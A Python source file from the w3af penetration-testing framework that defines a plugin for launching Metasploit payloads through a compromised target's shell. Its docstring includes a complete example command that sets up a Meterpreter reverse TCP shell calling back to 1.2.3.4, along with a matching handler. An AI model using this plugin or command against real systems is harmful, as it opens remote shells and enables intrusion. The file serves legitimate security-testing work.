from w3af.plugins.attack.payloads.base_payload import Payload
from w3af.core.controllers.vdaemon.vdFactory import get_virtual_daemon
from w3af.core.controllers.exceptions import BaseFrameworkException


class metasploit(Payload):
    """
    This payload interacts with the metasploit framework.

    Usage:
    You need to specify the payload type in MSF format as if you were calling msfpayload:
        linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4

    And then add a pipe ("|") to add the msfcli parameters for handling the
    incoming connection (in the case of a reverse shell) or connect to the
    remote server.

    A complete example looks like this:
        linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 | exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST=1.2.3.4 E
    """
    def api_execute(self, msf_args):
        try:
            vd = get_virtual_daemon(self.shell.execute)
        except BaseFrameworkException, w3:
            return 'Error, %s' % w3
        else:
            vd.run(msf_args)
            return 'Successfully started the virtual daemon.'

    def run_execute(self, msf_args):
        api_result = self.api_execute(msf_args)
        return api_result
